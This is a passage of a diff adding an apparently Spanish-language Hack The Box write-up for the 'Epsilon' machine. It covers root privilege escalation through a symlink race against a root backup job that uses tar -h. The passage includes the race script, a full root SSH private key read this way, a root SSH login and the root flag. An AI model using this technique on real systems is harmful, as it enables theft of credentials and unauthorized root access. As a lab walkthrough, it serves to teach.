+<span class="nv">check_file</span><span class="o">=</span><span class="sb">`</span><span class="nb">date</span> +%N<span class="sb">`</span>
+/usr/bin/tar <span class="nt">-chvf</span> <span class="s2">"/var/backups/web_backups/</span><span class="k">${</span><span class="nv">check_file</span><span class="k">}</span><span class="s2">.tar"</span> /opt/backups/checksum <span class="s2">"/opt/backups/</span><span class="nv">$file</span><span class="s2">.tar"</span>
+/usr/bin/rm <span class="nt">-rf</span> /opt/backups/<span class="k">*</span>
+</code></pre></div></div>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/epsilon/21.png" />
+</p>
+
+<ul>
+  <li>Podemos ver lo <code class="language-plaintext highlighter-rouge">.tar</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tom@epsilon:/dev/shm<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> /var/backups/web_backups
+total 3920
+<span class="nt">-rw-r--r--</span> 1 root root 1003520 Jul  5 01:35 095722698.tar
+<span class="nt">-rw-r--r--</span> 1 root root 1003520 Jul  5 01:36 111519042.tar
+<span class="nt">-rw-r--r--</span> 1 root root 1003520 Jul  5 01:37 125049838.tar
+<span class="nt">-rw-r--r--</span> 1 root root 1003520 Jul  5 01:38 140228143.tar
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Vamos a irnos a la ruta <code class="language-plaintext highlighter-rouge">/tmp</code> y crearemos un script.sh y le daremos permisos de ejecución.</p>
+  </li>
+  <li>
+    <p>Vamos a crear el archivo <code class="language-plaintext highlighter-rouge">/opt/backups/checksum</code> después lo vamos a borrar para hacer un enlace a <code class="language-plaintext highlighter-rouge">/root/.ssh/id_rsa</code> y secuestrarlo.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tom@epsilon:/tmp<span class="nv">$ </span><span class="nb">cat </span>zi.sh
+<span class="c">#!/bin/bash</span>
+
+<span class="k">while </span><span class="nb">true</span><span class="p">;</span> <span class="k">do
+	if</span> <span class="o">[</span> <span class="nt">-e</span> /opt/backups/checksum <span class="o">]</span><span class="p">;</span> <span class="k">then
+		</span><span class="nb">rm</span> /opt/backups/checksum
+		<span class="nb">ln</span> <span class="nt">-s</span> <span class="nt">-f</span> /root/.ssh/id_rsa /opt/backups/checksum
+	       <span class="nb">break
+</span><span class="k">fi
+done
+</span>tom@epsilon:/tmp<span class="nv">$ </span><span class="nb">chmod</span> +x zi.sh
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Esperamos unos minutos a que se ejecute la tarea.</p>
+  </li>
+  <li>
+    <p>Vamos a descomprimir el mas nuevo.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tom@epsilon:/tmp<span class="nv">$ </span>./zi.sh
+^C
+tom@epsilon:/tmp<span class="nv">$ </span><span class="nb">cd</span> /var/backups/web_backups/
+tom@epsilon:/var/backups/web_backups<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span>
+total 980
+<span class="nt">-rw-r--r--</span> 1 root root 1003520 Jul  5 01:50 311632114.tar
+tom@epsilon:/var/backups/web_backups<span class="nv">$ </span><span class="nb">cp </span>311632114.tar /tmp
+tom@epsilon:/var/backups/web_backups<span class="nv">$ </span><span class="nb">cd</span> /tmp
+tom@epsilon:/tmp<span class="nv">$ </span><span class="nb">tar</span> <span class="nt">-xf</span> 311632114.tar
+tom@epsilon:/opt/backups<span class="nv">$ </span><span class="nb">cd</span> /tmp/opt/backups/
+</code></pre></div></div>
+
+<ul>
+  <li>Vemos la id_rsa.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tom@epsilon:/tmp/opt/backups<span class="nv">$ </span><span class="nb">cat </span>checksum 
+<span class="nt">-----BEGIN</span> OPENSSH PRIVATE KEY-----
+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
+<span class="nv">BqhGglrHoh2JycJwAAAAxyb290QGVwc2lsb24BAgMEBQ</span><span class="o">==</span>
+<span class="nt">-----END</span> OPENSSH PRIVATE KEY-----
+tom@epsilon:/tmp/opt/backups<span class="nv">$ </span>
+</code></pre></div></div>
+
+<h2 id="shell-as-root-and-roottxt">Shell as root and root.txt</h2>
+
+<ul>
+  <li>Ahora podemos conectarnos como root por ssh.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nano id_rsa
+❯ <span class="nb">chmod </span>600 id_rsa
+❯ ssh <span class="nt">-i</span> id_rsa root@10.10.11.134
+The authenticity of host <span class="s1">'10.10.11.134 (10.10.11.134)'</span> can<span class="s1">'t be established.
+ED25519 key fingerprint is SHA256:RoZ8jwEnGGByxNt04+A/cdluslAwhmiWqG3ebyZko+A.
+This host key is known by the following other names/addresses:
+    ~/.ssh/known_hosts:36: [hashed name]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '</span>10.10.11.134<span class="s1">' (ED25519) to the list of known hosts.
+Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-97-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Fri 05 Jul 2024 01:56:45 AM UTC
+
+  System load:                      0.01
+  Usage of /:                       67.1% of 5.78GB
+  Memory usage:                     17%
+  Swap usage:                       0%
+  Processes:                        241
+  Users logged in:                  0
+  IPv4 address for br-a2acb156d694: 172.19.0.1
+  IPv4 address for docker0:         172.17.0.1
+  IPv4 address for eth0:            10.10.11.134
+  IPv6 address for eth0:            dead:beef::250:56ff:feb0:a1e8
+
+ * Super-optimized for small spaces - read how we shrank the memory
+   footprint of MicroK8s to make it the smallest full K8s around.
+
+   https://ubuntu.com/blog/microk8s-memory-optimisation
+
+0 updates can be applied immediately.
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+Last login: Mon Feb  7 01:51:07 2022
+root@epsilon:~# export TERM=xterm
+root@epsilon:~# cat /root/root.txt
+8a3e087754468be6d4bb82429fdae0db
+</span></code></pre></div></div>
+
+
+  </div><a class="u-url" href="/hackthebox/machines/medium/2024/07/04/epsilon.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col">
+        <p class="feed-subscribe">
+          <a href="http://localhost:4000/feed.xml">
+            <svg class="svg-icon orange">
+              <use xlink:href="/assets/minima-social-icons.svg#rss"></use>
+            </svg><span>Subscribe</span>
+          </a>
+        </p>
+        <ul class="contact-list">
+          <li class="p-name">MiguelRega7</li>
+          
+        </ul>
+      </div>
+      <div class="footer-col">
+        <p>Posts sobre resolución de CTFs y ciberseguridad.
+</p>
+      </div>
+    </div>
+
+    <div class="social-links"><ul class="social-media-list"><li>
+  <a rel="me" href="https://github.com/MikeRega7" target="_blank" title="github">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#github"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://www.instagram.com/_darkhorse77?igsh=MWZqYTAyYnJmYWZrdg%3D%3D&utm_source=qr" target="_blank" title="instagram">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#instagram"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://www.linkedin.com/in/juan-miguel-regalado-nu%C3%B1o-a3b14b278" target="_blank" title="linkedin">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#linkedin"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://twitter.com/MiguelJmrn7" target="_blank" title="twitter">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#twitter"></use>
+    </svg>
+  </a>
+</li>
+</ul>
+</div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
